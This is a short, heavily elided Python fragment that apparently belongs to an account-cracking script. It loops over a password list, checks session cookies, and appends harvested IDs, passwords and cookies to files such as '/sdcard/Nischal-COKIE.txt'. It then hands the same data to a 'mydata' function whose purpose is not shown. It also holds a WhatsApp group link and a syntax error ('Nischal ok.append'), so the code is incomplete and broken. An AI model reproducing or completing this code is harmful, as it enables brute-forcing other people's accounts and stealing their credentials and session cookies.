...
def Main():
	clear_terminal()
	link = "https://chat.whatsapp.com/DN5gBJnafyZAceDOQWrx4E"
	...
	try:
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				...
				open('/sdcard/Nischal-COKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
				open('/sdcard/Nischa-OK.txt','a').write(ids+'|'+pas+'\n')
				Nischal ok.append(ids)
				data = ids+'|'+pas+'|'+coki
				mydata(data)
				break
			else:
